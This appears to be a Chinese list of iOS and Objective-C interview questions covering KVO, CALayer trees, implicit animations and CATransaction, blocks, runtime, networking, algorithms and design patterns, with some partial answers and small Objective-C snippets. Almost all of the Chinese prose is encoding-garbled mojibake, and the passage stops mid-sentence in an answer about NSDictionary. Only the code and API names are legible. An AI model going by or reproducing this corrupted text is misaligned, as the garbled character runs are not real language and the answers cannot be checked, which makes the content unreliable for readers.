6. `include` å’Œ `import` ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿå®ƒä»¬æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ

7. ä»‹ç»ä¸€ä¸‹ `KVC` å’Œ `KVO` åŠå…¶å®ç°åŸç†
KVO - Key-Value-Observing é”®å€¼è§‚å¯Ÿæ˜¯åŸºäºKVCå®ç°çš„ä¸€ç§è§‚å¯Ÿè€…æœºåˆ¶ï¼Œæä¾›äº†è§‚å¯Ÿå¯¹è±¡çš„æŸä¸€ä¸ªå±æ€§å˜åŒ–çš„ç›‘å¬æ–¹æ³•ã€‚
KVOåˆ©ç”¨runtimeçš„æœºåˆ¶ï¼Œå½“å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œè§‚å¯Ÿæ—¶ï¼Œä¼šåœ¨è¿è¡Œæ—¶åˆ›å»ºä¸€ä¸ªè¯¥å¯¹è±¡çš„å­ç±»ï¼Œè¿™ä¸ªå­ç±»ä¸€èˆ¬ä»¥NSKVONotifying_xxxï¼ˆxxxä¸ºçˆ¶ç±»çš„åå­—ï¼‰å‘½åï¼Œå­ç±»ä¸­ä¼šé‡å†™æ‰€æœ‰è¢«è§‚å¯Ÿå±æ€§çš„setæ–¹æ³•ï¼Œé™¤äº†åˆ›å»ºå­ç±»ï¼Œè¿˜ä¼šå°†è¯¥å¯¹è±¡çš„isaæŒ‡é’ˆæŒ‡å‘è¿™ä¸ªå­ç±»ï¼Œå½“è¢«è§‚å¯Ÿçš„å¯¹è±¡å±æ€§ä¿®æ”¹æ—¶ï¼Œé€šè¿‡isaæ‰¾åˆ°å­ç±»ï¼Œåœ¨é€šè¿‡å­ç±»çš„æ–¹æ³•åˆ—è¡¨æ‰¾åˆ°å¯¹åº”çš„setæ–¹æ³•ï¼Œsetæ–¹æ³•æ˜¯è¢«é‡å†™è¿‡å¾—ï¼Œé‡Œé¢å®ç°äº†ç›¸å…³çš„é€šçŸ¥ã€‚

8. ä»‹ç»ä¸€ä¸‹ OC çš„æ¶ˆæ¯ä¼ é€’æœºåˆ¶
9. ä»‹ç»ä¸€ä¸‹ OC çš„æ¶ˆæ¯è½¬å‘æœºåˆ¶
10. OC æ”¯æŒå¤šç»§æ‰¿å—ï¼Ÿå¦‚ä½•å®ç° OC çš„å¤šç»§æ‰¿ï¼Ÿ
11. OC æ”¯æŒæ–¹æ³•é‡è½½å—ï¼Ÿ
12. `CALayer` æœ‰å“ªä¸‰ç§æ ‘ï¼Ÿ
layer tree  åˆ†ä¸º model layer tree(æ¨¡å‹å›¾å±‚æ ‘) ã€presentation layer treeï¼ˆè¡¨ç¤ºå›¾å±‚æ ‘ï¼‰ ã€render layer treeï¼ˆæ¸²æŸ“å›¾å±‚æ ‘ï¼‰
æ¨¡å‹å›¾å±‚æ ‘ ä¸­çš„å¯¹è±¡æ˜¯åº”ç”¨ç¨‹åºä¸ä¹‹äº¤äº’çš„å¯¹è±¡ã€‚æ­¤æ ‘ä¸­çš„å¯¹è±¡æ˜¯å­˜å‚¨ä»»ä½•åŠ¨ç”»çš„ç›®æ ‡å€¼çš„æ¨¡å‹å¯¹è±¡ã€‚æ¯å½“æ›´æ”¹å›¾å±‚çš„å±æ€§æ—¶ï¼Œéƒ½ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªå¯¹è±¡ã€‚
modelLayer

è¡¨ç¤ºå›¾å±‚æ ‘ ä¸­çš„å¯¹è±¡åŒ…å«ä»»ä½•æ­£åœ¨è¿è¡Œçš„åŠ¨ç”»çš„é£è¡Œä¸­å€¼ã€‚å±‚æ ‘å¯¹è±¡åŒ…å«åŠ¨ç”»çš„ç›®æ ‡å€¼ï¼Œè€Œè¡¨ç¤ºæ ‘ä¸­çš„å¯¹è±¡åæ˜ å±å¹•ä¸Šæ˜¾ç¤ºçš„å½“å‰å€¼ã€‚æ‚¨æ°¸è¿œä¸åº”è¯¥ä¿®æ”¹æ­¤æ ‘ä¸­çš„å¯¹è±¡ã€‚ç›¸åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›å¯¹è±¡æ¥è¯»å–å½“å‰åŠ¨ç”»å€¼ï¼Œä¹Ÿè®¸æ˜¯ä¸ºäº†ä»è¿™äº›å€¼å¼€å§‹åˆ›å»ºæ–°åŠ¨ç”»ã€‚
presentationLayer

æ¸²æŸ“å›¾å±‚æ ‘ ä¸­çš„å¯¹è±¡æ‰§è¡Œå®é™…åŠ¨ç”»ï¼Œå¹¶ä¸”æ˜¯Core Animationçš„ç§æœ‰åŠ¨ç”»ã€‚ä½¿ç”¨ä¸ä¸Š

 self.layer = self.layer.modelLayer ã€self.layer != self.layer.presentationLayerã€‚ 
 ### layeræœ¬èº«å°±æ˜¯ä¸€ä¸ªmodelLayerï¼Œåªä¸è¿‡å®ƒæ‹¥æœ‰presentationLayerã€‚
 
 Core AnimationåŠ¨ç”»æ‰§è¡Œçš„æ—¶é—´å–å†³äºå½“å‰äº‹åŠ¡çš„è®¾ç½®ï¼ŒåŠ¨ç”»ç±»å‹å–å†³äºå›¾å±‚è¡Œä¸ºã€‚


13. ä»€ä¹ˆæ˜¯éšå¼åŠ¨ç”»ï¼Ÿå¦‚ä½•å…³é—­éšå¼åŠ¨ç”»ï¼Ÿ CATransaction
ä»»ä½•Layerçš„animatableå±æ€§çš„è®¾ç½®éƒ½åº”è¯¥å±äºæŸä¸ªCAäº‹åŠ¡(CATransaction),äº‹åŠ¡çš„ä½œç”¨æ˜¯ä¸ºäº†ä¿è¯å¤šä¸ªanimatableå±æ€§çš„å˜åŒ–åŒæ—¶è¿›è¡Œ,ä¸ç®¡æ˜¯åŒä¸€ä¸ªlayerè¿˜æ˜¯ä¸åŒçš„layerä¹‹é—´çš„.CATransactionä¹Ÿåˆ†ä¸¤ç±»,æ˜¾å¼çš„å’Œéšå¼çš„,å½“åœ¨æŸæ¬¡RunLoopä¸­è®¾ç½®ä¸€ä¸ªanimatableå±æ€§çš„æ—¶å€™,å¦‚æœå‘ç°å½“å‰æ²¡æœ‰äº‹åŠ¡,åˆ™ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªCAäº‹åŠ¡,åœ¨çº¿ç¨‹çš„ä¸‹ä¸ªRunLoopå¼€å§‹æ—¶è‡ªåŠ¨commitè¿™ä¸ªäº‹åŠ¡,å¦‚æœåœ¨æ²¡æœ‰RunLoopçš„åœ°æ–¹è®¾ç½®layerçš„animatableå±æ€§,åˆ™å¿…é¡»ä½¿ç”¨æ˜¾å¼çš„äº‹åŠ¡.

äº‹åŠ¡ï¼šåŒ…å«ä¸€ç³»åˆ—å±æ€§åŠ¨ç”»é›†åˆçš„æœºåˆ¶ï¼Œç”¨æŒ‡å®šäº‹åŠ¡å»æ”¹å˜å¯ä»¥åšåŠ¨ç”»çš„å›¾å±‚å±æ€§ä¸ä¼šç«‹åˆ»å‘ç”Ÿå˜åŒ–ï¼Œè€Œæ˜¯å½“äº‹åŠ¡ä¸€æ—¦æäº¤çš„æ—¶å€™å¼€å§‹ç”¨ä¸€ä¸ªåŠ¨ç”»è¿‡æ¸¡åˆ°æ–°å€¼.
äº‹åŠ¡ é€šè¿‡CATransactionç±»æ¥åšç®¡ç†ï¼ŒCATransactionå¯ä»¥ç”¨åŠ å·æ–¹æ³•+beginå’Œ+commitåˆ†åˆ«æ¥å…¥æ ˆæˆ–è€…å‡ºæ ˆã€‚å¹¶ä¸”éµå¾ªå…ˆè¿›åå‡º
ä»»ä½•å¯ä»¥åšåŠ¨ç”»çš„å›¾å±‚å±æ€§éƒ½ä¼šè¢«æ·»åŠ åˆ°æ ˆé¡¶çš„äº‹åŠ¡ï¼Œä½ å¯ä»¥é€šè¿‡+setAnimationDuration:æ–¹æ³•è®¾ç½®å½“å‰äº‹åŠ¡çš„åŠ¨ç”»æ—¶é—´ï¼Œæˆ–è€…é€šè¿‡+animationDurationæ–¹æ³•æ¥è·å–å€¼ï¼ˆé»˜è®¤0.25ç§’ï¼‰ã€‚

æ˜¾å¼äº‹åŠ¡çš„ä½¿ç”¨å¦‚ä¸‹ï¼š
[CATransaction begin];

...  

[CATransaction commit];

äº‹åŠ¡å¯ä»¥åµŒå¥—.å½“äº‹åŠ¡åµŒå¥—æ—¶å€™,åªæœ‰å½“æœ€å¤–å±‚çš„äº‹åŠ¡commitäº†ä¹‹å,æ•´ä¸ªåŠ¨ç”»æ‰å¼€å§‹.

å¯ä»¥é€šè¿‡CATransactionæ¥è®¾ç½®ä¸€ä¸ªäº‹åŠ¡çº§åˆ«çš„åŠ¨ç”»å±æ€§,è¦†ç›–éšå¼åŠ¨ç”»çš„ç›¸å…³å±æ€§,æ¯”å¦‚è¦†ç›–éšå¼åŠ¨ç”»çš„duration,timingFunction.å¦‚æœæ˜¯æ˜¾å¼åŠ¨ç”»æ²¡æœ‰è®¾ç½®durationæˆ–è€…timingFunction,é‚£ä¹ˆCAäº‹åŠ¡è®¾ç½®çš„è¿™äº›å‚æ•°ä¹Ÿä¼šå¯¹è¿™ä¸ªæ˜¾å¼åŠ¨ç”»èµ·ä½œç”¨.
//å…³é—­éšå¼åŠ¨ç”»
CATransaction åœ¨ Core Animation frameworkä¸­ä¸»è¦æ‰®æ¼”äº†â€œæ•´ä½“èˆå°è®¾å®šçš„è§’è‰²â€ã€‚

ä½¿ç”¨ CATransaction çš„æ–¹å¼å°±æ˜¯æŠŠæˆ‘ä»¬æƒ³åšçš„ç‰¹åˆ«çš„è®¾å®šçš„åŠ¨ç”»ä»£ç ï¼Œç”¨ CATransaction çš„class methodå‰ååŒ…èµ·æ¥ã€‚

æ¯”æ–¹è¯´ï¼Œæˆ‘ä»¬ç°åœ¨ä¸å¸Œæœ›äº§ç”ŸåŠ¨ç”»ï¼Œä¾¿å¯ä»¥è¿™æ ·å†™ï¼š
[CATransaction begin];
[CATransaction setDisableActions:YES];
//åŸæœ¬åŠ¨ç”»çš„ä»£ç 
[CATransaction commit];

å¦‚æœæˆ‘ä»¬æƒ³è¦æ”¹å˜åŠ¨ç”»æ—¶é—´ï¼š

[CATransaction begin];
[CATransaction setAnimationDuration:1.0];
    
14. ä»‹ç»ä¸€ä¸‹ `block` åŠå…¶å®ç°åŸç†
15. å¦‚ä½•åœ¨`block` å†…éƒ¨ä¿®æ”¹å¤–éƒ¨å˜é‡ï¼Ÿ
16. `block` ç§ç±»æœ‰å“ªäº›ï¼Ÿ `block`  ä¸ºä»€ä¹ˆè¦ç”¨ `copy` ä¿®é¥°ï¼Ÿ
17. `autoReleasePool` çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ
18. `ARC` å’Œ `MRC` çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ
19. ä»‹ç»ä¸€ä¸‹å¼•ç”¨è®¡æ•°ã€‚ä¸€ä¸ªå¯¹è±¡ä»€ä¹ˆæ—¶å€™å…¶å¼•ç”¨è®¡æ•°æ‰ä¼šå˜ä¸º 0?
20. ä¸»çº¿ç¨‹å’Œå­çº¿ç¨‹çš„åŒºåˆ«ï¼Ÿä¸ºä»€ä¹ˆåˆ·æ–° UI è¦æ”¾åˆ°ä¸»çº¿ç¨‹ï¼Ÿ
21. ä»‹ç»ä¸€ä¸‹å¤šçº¿ç¨‹ã€‚å®ç°å¤šçº¿ç¨‹æœ‰å“ªå‡ ç§æ–¹å¼ï¼Ÿ
22. ä»‹ç»ä¸€ä¸‹ `runtime` æœºåˆ¶ã€‚`runtime` åœ¨æ—¥å¸¸å¼€å‘ä¸­éƒ½æœ‰å“ªäº›ç”¨é€”ï¼Ÿ
23. ä»‹ç»ä¸€ä¸‹ `runloop`ã€‚æ—¥å¸¸å¼€å‘ä¸­æ€ä¹ˆä½¿ç”¨çš„ï¼Ÿ
24. `cell` çš„å¤ç”¨æœºåˆ¶åŠåŸç†ï¼Œå¦‚ä½•è‡ªå·±è®¾è®¡ä¸€ä¸ª `cell` å¤ç”¨æ± ï¼Ÿ
25. `UITableView` å¦‚ä½•ä¼˜åŒ–ï¼Ÿä¼˜åŒ–çš„ 9 ä¸ªå»ºè®®
26. å¦‚ä½•æ‰©å¤§ä¸€ä¸ªæŒ‰é’®çš„ç‚¹å‡»åŒºåŸŸï¼Ÿ
27. `OC` çš„ `category` å’Œ `extension` çš„åŒºåˆ«
28. å¦‚ä½•è®¾è®¡ä¸€ä¸‹ç½‘ç»œåº“ï¼Ÿ
29. ä»‹ç»ä¸€ä¸‹ `MVC` ã€`MVVM` å’Œ MVPï¼Œ ä»¥åŠå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«
30. ä»‹ç»ä¸€ä¸‹ OC ä¸­çš„ç±»ç°‡
31. `CoreAnimation` åœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­åšäº†ä»€ä¹ˆï¼Ÿ
32. è¯´ä¸€ä¸‹çº¿ç¨‹å’Œ `runloop` çš„å…³ç³»
33. æ—¥å¸¸å¼€å‘ä¸­ç”¨åˆ°è¿‡å“ªäº›ä¸‰æ–¹åº“ï¼Ÿæœ‰çœ‹è¿‡ä¸‰æ–¹åº“çš„æºç å—ï¼Ÿä¸€äº›çŸ¥åçš„ä¸‰æ–¹åº“å®ç°åŸç†ã€‚
34. æ‰‹å†™ä¸€ä¸ªå•ä¾‹
35. `Hybrid` ä¸åŸç”Ÿäº¤äº’åŸç†ï¼ˆè¿‡ç¨‹ï¼‰
36. å¡é¡¿ç›‘æ§æ–¹æ¡ˆ
37. å¦‚ä½•è§£å†³åœ¨ä½¿ç”¨ `NSTimer` æˆ– `CADisplayLink` è¿‡ç¨‹ä¸­çš„å†…å­˜æ³„æ¼é—®é¢˜ï¼Ÿ
38. åšè¿‡ç»„ä»¶åŒ–å—ï¼Ÿç»„ä»¶åŒ–çš„æ–¹æ¡ˆæœ‰å“ªå‡ ç§ï¼Ÿ
39. åŸå­é”å’ŒéåŸå­é” ï¼ˆatomic å’Œ nonatomicï¼‰
40. æ—¥å¸¸ä¸­ç”¨åˆ°çš„é”æœ‰å“ªäº›ï¼Ÿ
41. iOS ä¸­å†…çœçš„å‡ ä¸ªæ–¹æ³•ï¼Ÿclassæ–¹æ³•å’Œobjc_getClassæ–¹æ³•æœ‰ä»€ä¹ˆåŒºåˆ«?
42. [self class] ä¸ [super class] åˆ†åˆ«æ‰“å°å‡ºæ¥ä»€ä¹ˆï¼Ÿå¦‚ä½•è·å–å½“å‰ç±»çš„çˆ¶ç±»ï¼Ÿ
43. self.name = object ä¸ _name = object ä¹‹é—´æœ‰ä½•åŒºåˆ«ï¼Ÿåœ¨å¯¹è±¡çš„ init æ–¹æ³•ä¸­èµ‹å€¼æ—¶åº”è¯¥ä½¿ç”¨ä¸Šè¿°äºŒè€…ä¸­çš„å“ªä¸€ç§åŠåŸå› ï¼Ÿ
44. å¦‚ä½•åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰ï¼Ÿ
45. weak çš„å®ç°åŸç†
46. load å’Œ initialize æ–¹æ³•çš„åŒºåˆ«åŠå®ƒä»¬ä¹‹é—´çš„åŠ è½½é¡ºåº
47. ä»‹ç»ä¸€ä¸‹ `OC` çš„å“åº”é“¾
48. `category` åŠ è½½æ—¶æœºåŠåŠ è½½é¡ºåº
49. `WKWebbiew` ç™½å±é—®é¢˜
50. æ•°æ®æŒä¹…åŒ–çš„æ–¹æ¡ˆéƒ½æœ‰å“ªäº›ï¼ˆæ•°æ®åº“æ˜¯é‡ç‚¹ï¼‰
51. KVOï¼ŒNotification, delegate çš„ä¼˜ç¼ºç‚¹ï¼Œæ•ˆç‡åŠä½¿ç”¨åœºæ™¯
52. å¦‚ä½•ç›‘æ§ä¸€ä¸ªé¡µé¢æŒæœ‰çš„å¯¹è±¡æ˜¯å¦æœ‰å†…å­˜æ³„æ¼é—®é¢˜ï¼Ÿ
53. æœ‰çœ‹è¿‡ `OC` åº•å±‚æºç ï¼Ÿä»‹ç»ä¸€ä¸‹ä½ ç†Ÿæ‚‰çš„

swift
0. `swift` ç›¸æ¯” `OC` æœ‰ä»€ä¹ˆä¼˜ç‚¹ï¼Ÿ
1. `swift` çš„è¯­è¨€æœ‰å“ªäº›ç‰¹ç‚¹ï¼Ÿ
2. ä»‹ç»ä¸€ä¸‹å‡½æ•°å¼ç¼–ç¨‹
3. `swift` ä¸ºä»€ä¹ˆä¸æ”¯æŒé™æ€åº“ï¼Ÿ
4. `swift` çš„ `extension` å’Œ `category` çš„åŒºåˆ«ï¼Ÿ ä»¥åŠå®ƒä»¬ä¸ `OC` çš„åŒºåˆ«ï¼Ÿ
5. `swift` æœ‰å“ªäº›æ–°çš„è¯­è¨€ç‰¹æ€§ï¼Ÿ
6. ä»‹ç»ä¸€ä¸‹ `swift` çš„æ³›å‹

è®¡ç®—æœº
0. è¯´ä¸€ä¸‹`ä¸‰æ¬¡æ¡æ‰‹`å’Œ`å››æ¬¡æŒ¥æ‰‹`
1. è¯´ä¸€ä¸‹ `TCP` å’Œ `UDP` çš„åŒºåˆ«ï¼Ÿ
2. è¯´ä¸€ä¸‹ `HTTP` å’Œ `HTTPs` çš„åŒºåˆ«ï¼Ÿ
3. `SSL/TSL` çš„è¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ
4. ç½‘ç»œéƒ½åˆ†ä¸ºå“ªå‡ å±‚ï¼Ÿä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ
5. å¸¸è§çš„ `HTTP` çŠ¶æ€å€¼åŠé‡Šä¹‰
6. ä»€ä¹ˆæ˜¯ `socket` ç¼–ç¨‹ï¼Ÿä»€ä¹ˆæ˜¯ `websocket`?ä»€ä¹ˆæ˜¯å¿ƒè·³ï¼Ÿ
7. è¯´ä¸€ä¸‹ `HTTP` çš„è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡çš„æ ¼å¼
8. ç®€è¿° https åè®®æ˜¯å¦‚ä½•ä¿è¯å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´è¿›è¡Œå®‰å…¨é€šä¿¡çš„ï¼Ÿä¸ºäº†ä¿è¯é€šä¿¡ä¸è¢«çªƒå¬ï¼Œå®¢æˆ·ç«¯åº”è¯¥æœ‹é‡‡å–ä»€ä¹ˆæªæ–½ï¼Ÿ
9. `GET` ä¸ `POST` æ–¹æ³•åŒºåˆ«ï¼Ÿ
10. `HTTP` å¸¸ç”¨çš„è¯·æ±‚å¤´éƒ½æœ‰å“ªäº›ï¼Ÿ

0. `iOS` åœ¨ `pre-main` é˜¶æ®µéƒ½åšäº†äº›ä»€ä¹ˆ
1. ç¼–è¯‘çš„è¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ
2. `clang` æ¥è§¦è¿‡å—ï¼Ÿä»‹ç»ä¸€ä¸‹ `clang`
3. `OC` çš„ `pre-main` é˜¶æ®µéƒ½åšäº†å“ªäº›äº‹æƒ…ï¼Ÿ
4. é“¾æ¥çš„è¿‡ç¨‹éƒ½åšäº†å“ªäº›äº‹æƒ…ï¼Ÿ
5. `OC` çš„å†…å­˜åŒºå—éƒ½æœ‰å“ªäº›ï¼Ÿ

0. ç®—æ³•æ—¶é—´å¤æ‚åº¦æ˜¯æŒ‡ä»€ä¹ˆï¼Ÿ
1. `B` æ ‘ï¼Œ`B+` æ ‘ï¼Œ`B*` æ ‘çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿä»€ä¹ˆæ˜¯çº¢é»‘æ ‘ï¼Ÿ
2. `C` è¯­è¨€ä¸­éƒ½æœ‰å“ªäº›æ•°æ®ç»“æ„ï¼Ÿ
3. hash è¡¨æ˜¯æ€æ ·å®ç°çš„ï¼Ÿ
4. ä½¿ç”¨é€’å½’åˆ¤æ–­å›æ–‡ã€‚å¦‚ level å°±æ˜¯ä¸€ä¸ªå›æ–‡
5. åè½¬é“¾è¡¨
6. åˆ¤æ–­é•œåƒäºŒå‰æ ‘
7. æ±‚ä¸€ä¸ªäºŒå‰æ ‘çš„åº¦
8. å¿«é€Ÿæ’åºï¼Œå†’æ³¡æ’åºï¼Œæ’å…¥æ’åº
9. `LRU` ç®—æ³•
10. ä¸¤ä¸ªæ ˆå®ç°ä¸€ä¸ªé˜Ÿåˆ—

0. `23` ç§è®¾è®¡æ¨¡å¼ç†Ÿæ‚‰ä¸€ä¸‹
1. è®¾è®¡æ¨¡å¼æœ‰å“ª `6` å¤§è®¾è®¡åŸåˆ™ï¼Ÿ
2. ç®€å•å·¥å‚æ¨¡å¼ï¼Œå·¥å‚æ¨¡å¼ï¼ŒæŠ½è±¡å·¥å‚æ¨¡å¼
3. ä¸­ä»‹è€…æ¨¡å¼
4. å¤–è§‚æ¨¡å¼
5. è§‚å¯Ÿè€…æ¨¡å¼

1ã€è¯´ä¸€ä¸‹OCçš„åå°„æœºåˆ¶ï¼›
ç³»ç»ŸFoundationæ¡†æ¶ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›æ–¹æ³•åå°„çš„APIï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™äº›APIæ‰§è¡Œå°†å­—ç¬¦ä¸²è½¬ä¸ºSELç­‰æ“ä½œã€‚ç”±äºOCè¯­è¨€çš„åŠ¨æ€æ€§ï¼Œè¿™äº›æ“ä½œéƒ½æ˜¯å‘ç”Ÿåœ¨è¿è¡Œæ—¶çš„ã€‚
```
// SELå’Œå­—ç¬¦ä¸²è½¬æ¢
FOUNDATION_EXPORT NSString *NSStringFromSelector(SEL aSelector);
FOUNDATION_EXPORT SEL NSSelectorFromString(NSString *aSelectorName);
// Classå’Œå­—ç¬¦ä¸²è½¬æ¢
FOUNDATION_EXPORT NSString *NSStringFromClass(Class aClass);
FOUNDATION_EXPORT Class __nullable NSClassFromString(NSString *aClassName);
// Protocolå’Œå­—ç¬¦ä¸²è½¬æ¢
FOUNDATION_EXPORT NSString *NSStringFromProtocol(Protocol *proto) NS_AVAILABLE(10_5, 2_0);
FOUNDATION_EXPORT Protocol * __nullable NSProtocolFromString(NSString *namestr) NS_AVAILABLE(10_5, 2_0);
```
2ã€blockçš„å®è´¨æ˜¯ä»€ä¹ˆï¼Ÿæœ‰å‡ ç§blockï¼Ÿåˆ†åˆ«æ˜¯æ€æ ·äº§ç”Ÿçš„ï¼Ÿ
å®è´¨ä¹Ÿæ˜¯OCå¯¹è±¡ å› ä¸ºå…·æœ‰isaæŒ‡é’ˆ
æ ¹æ®isaæŒ‡é’ˆï¼Œblockä¸€å…±æœ‰3ç§ç±»å‹çš„block
_NSConcreteGlobalBlock 
å…¨å±€é™æ€_NSConcreteStackBlock ä¿å­˜åœ¨æ ˆä¸­ï¼Œå‡ºå‡½æ•°ä½œç”¨åŸŸå°±é”€æ¯
_NSConcreteMallocBlock ä¿å­˜åœ¨å †ä¸­ï¼ŒretainCount == 0é”€æ¯


3ã€__blockä¿®é¥°çš„å˜é‡ä¸ºä»€ä¹ˆèƒ½åœ¨blocké‡Œé¢èƒ½æ”¹å˜å…¶å€¼ï¼Ÿ
åŠ äº†__block, å¹¶ä¸æ˜¯ç›´æ¥ä¼ é€’å¯¹è±¡çš„å€¼äº†ï¼Œè€Œæ˜¯æŠŠå¯¹è±¡çš„åœ°å€ä¼ è¿‡å»äº†ï¼Œæ‰€ä»¥åœ¨blockå†…éƒ¨ä¾¿å¯ä»¥ä¿®æ”¹åˆ°å¤–é¢çš„å˜é‡äº†ã€‚

4ã€è¯´ä¸€ä¸‹çº¿ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚(å¤šçº¿ç¨‹å‡ ç§æ–¹å¼)
- (void)performSelectorOnMainThread:(SEL)aSelector withObject:(id)arg waitUntilDone:(BOOL)wait;
- (void)performSelector:(SEL)aSelector onThread:(NSThread *)thr withObject:(id)arg waitUntilDone:(BOOL)wait;
GCD/NSThread/NSOperation

5ã€åº”ç”¨çš„å´©æºƒï¼Ÿ
å­˜åœ¨CPUæ— æ³•è¿è¡Œçš„ä»£ç 
ä¸å­˜åœ¨æˆ–è€…æ— æ³•æ‰§è¡Œ
æ“ä½œç³»ç»Ÿæ‰§è¡ŒæŸé¡¹ç­–ç•¥ï¼Œç»ˆæ­¢ç¨‹åº
å¯åŠ¨æ—¶é—´è¿‡é•¿æˆ–è€…æ¶ˆè€—è¿‡å¤šå†…å­˜æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šç»ˆæ­¢ç¨‹åºè¿è¡Œ
ç¼–ç¨‹è¯­è¨€ä¸ºäº†é¿å…é”™è¯¯ç»ˆæ­¢ç¨‹åºï¼šæŠ›å‡ºå¼‚å¸¸
å¼€å‘è€…ä¸ºäº†é¿å…å¤±è´¥ç»ˆæ­¢ç¨‹åºï¼šAssert

ç¬¦å·åŒ–
app.xcarchiveæ–‡ä»¶ï¼ŒåŒ…å†…å®¹åŒ…å«dSYMå’Œåº”ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚
æ›´ç²¾ç¡®çš„ç¬¦å·åŒ–ï¼Œå¯ä»¥ç»“åˆå´©æºƒæ—¥å¿—ã€é¡¹ç›®äºŒè¿›åˆ¶æ–‡ä»¶ã€dSYMæ–‡ä»¶ï¼Œå¯¹å…¶è¿›è¡Œåæ±‡ç¼–ï¼Œä»è€Œè·å¾—æ›´è¯¦ç»†çš„ä¿¡æ¯

6ã€è¯´ä¸€ä¸‹hashç®—æ³•
MD5åŠ å¯†
å“ˆå¸Œï¼ˆHashï¼‰ç®—æ³•ï¼Œå³æ•£åˆ—å‡½æ•°ã€‚å®ƒæ˜¯ä¸€ç§å•å‘å¯†ç ä½“åˆ¶ï¼Œå³å®ƒæ˜¯ä¸€ä¸ªä»æ˜æ–‡åˆ°å¯†æ–‡çš„ä¸å¯é€†çš„æ˜ å°„ï¼Œåªæœ‰åŠ å¯†è¿‡ç¨‹ï¼Œæ²¡æœ‰è§£å¯†è¿‡ç¨‹ã€‚åŒæ—¶ï¼Œå“ˆå¸Œå‡½æ•°å¯ä»¥å°†ä»»æ„é•¿åº¦çš„è¾“å…¥ç»è¿‡å˜åŒ–ä»¥åå¾—åˆ°å›ºå®šé•¿åº¦çš„è¾“å‡ºã€‚å“ˆå¸Œå‡½æ•°çš„è¿™ç§å•å‘ç‰¹å¾å’Œè¾“å‡ºæ•°æ®é•¿åº¦å›ºå®šçš„ç‰¹å¾ä½¿å¾—å®ƒå¯ä»¥ç”Ÿæˆæ¶ˆæ¯æˆ–è€…æ•°æ®ã€‚

7ã€NSDictionaryçš„å®ç°åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ
åœ¨OCä¸­NSDictionaryæ˜¯ä½¿ç”¨hashè¡¨æ¥å®ç°keyå’Œvalueçš„æ˜ å°„å’Œå­˜å‚¨çš„ã€‚
å“ˆå¸Œè¡¨ï¼ˆhashè¡¨ï¼‰ï¼š åˆå«åšæ•£åˆ—è¡¨ï¼Œæ˜¯æ ¹æ®å…³é”®ç å€¼ï¼ˆkey valueï¼‰è€Œç›´æ¥è®¿é—®çš„ æ•°æ®ç»“æ„ ã€‚ä¹Ÿå°±æ˜¯è¯´å®ƒé€šè¿‡å…³é”®ç å€¼æ˜ å°„åˆ°è¡¨ä¸­ä¸€ä¸ªä½ç½®æ¥è®¿é—®è®°å½•ï¼Œä»¥åŠ å¿«æŸ¥æ‰¾çš„é€Ÿåº¦ã€‚è¿™ä¸ªæ˜ å°„å«åš å‡½æ•° ï¼Œå­˜æ”¾è®°å½•çš„ æ•°ç»„ å«åš å“ˆå¸Œè¡¨ ã€‚
OCä¸­çš„å­—å…¸å…¶å®æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­æ¯ä¸€ä¸ªå…ƒç´ åŒæ ·ä¸ºä¸€ä¸ªé“¾è¡¨å®ç°çš„æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯æ•°ç»„ä¸­å¥—æ•°ç»„ã€‚

é‚£ä¹ˆå¯¹åº”åœ¨ocä¸­å­—å…¸æ˜¯å¦‚ä½•è¿›è¡Œå­˜å‚¨çš„å‘¢ï¼Ÿ

åœ¨ocä¸­æ¯ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶ï¼Œéƒ½é»˜è®¤ç”Ÿæˆä¸€ä¸ªhashCode,ä¹Ÿå°±æ˜¯ç»è¿‡hashç®—æ³•ç”Ÿæˆçš„ä¸€ä¸²æ•°å­—ï¼Œå½“åˆ©ç”¨keyå»å–å­—å…¸ä¸­çš„valueæ—¶ï¼Œè‹¥æ˜¯ä½¿ç”¨éå†æˆ–è€…äºŒåˆ†æŸ¥æ‰¾ç­‰æ–¹æ³•ï¼Œæ•ˆç‡ç›¸å¯¹è¾ƒä½ï¼Œäºæ˜¯å‡ºç°äº†æ ¹æ®æ¯ä¸€ä¸ªkeyç”Ÿæˆçš„hashCodeå°†é”®å€¼å¯¹æ”¾åˆ°hasCodeå¯¹åº”çš„æ•°ç»„ä¸­çš„æŒ‡å®šä½ç½®ï¼Œè¿™æ ·å½“ç”¨keyå»å–å€¼æ—¶ï¼Œä¾¿ä¸å¿…éå†å»è·å–ï¼Œæ—¢å¯ä»¥æ ¹æ®hashCodeç›´æ¥å–å‡ºã€‚å› ä¸ºhashCodeçš„å€¼è¿‡å¤§ï¼Œæˆ–è®¸ç»è¿‡å–ä½™è·å–ä¸€ä¸ªè¾ƒå°çš„æ•°å­—ï¼Œå‡å¦‚æ˜¯å¯¹999è¿›è¡Œå–ä½™è¿ç®—ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ç»“æœå§‹ç»ˆå¤„äº0-999ä¹‹é—´ã€‚ä½†æ˜¯ï¼Œè¿™æ 